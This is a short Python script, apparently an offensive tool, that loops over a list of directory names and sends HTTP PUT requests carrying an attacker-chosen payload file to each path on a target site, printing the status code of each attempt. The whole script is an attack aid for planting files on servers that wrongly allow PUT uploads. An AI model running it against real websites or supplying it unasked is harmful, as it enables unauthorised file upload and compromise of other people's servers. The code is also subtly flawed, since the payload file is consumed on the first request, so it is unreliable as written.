import requests

#substitute "FOO_DIRECTORIES" with your directory list
dir_list = open('FOO_DIRECTORIES', 'r')
#sustitute "FOO_URL" with the target URL
site_url = 'FOO_URL'
#substitute "FOO_PAYLOAD" with the file you want to upload
payload = open('FOO_PAYLOAD', 'r')

for line in dir_list:
    dir = line.rstrip('\n')
    r = requests.put(site_url + dir , data=payload)
    print('Uploading to ', dir, '\n', r.status_code)
